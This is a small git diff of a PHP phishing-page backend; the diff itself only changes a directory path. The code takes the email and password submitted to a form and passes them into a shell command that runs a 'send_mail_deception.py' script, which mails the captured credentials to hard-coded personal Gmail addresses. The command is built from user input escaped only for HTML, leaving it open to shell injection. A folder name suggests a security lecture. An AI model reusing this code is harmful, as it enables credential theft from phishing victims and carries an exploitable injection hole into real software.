@@ -1,6 +1,6 @@
 <?php
     $old_path = getcwd();
-    chdir('/home/ariz/cyber_lecture/');
+    chdir('/home/ariz/git/cube/');
      $username =  htmlspecialchars($_POST["email"]);
      $password =  htmlspecialchars($_POST["pass"]);
     $cmd = './send_mail_deception.py arizigler@gmail.com ari.zigler@gmail.com "user_name:'. $username . ' password: ' . $password . '"';
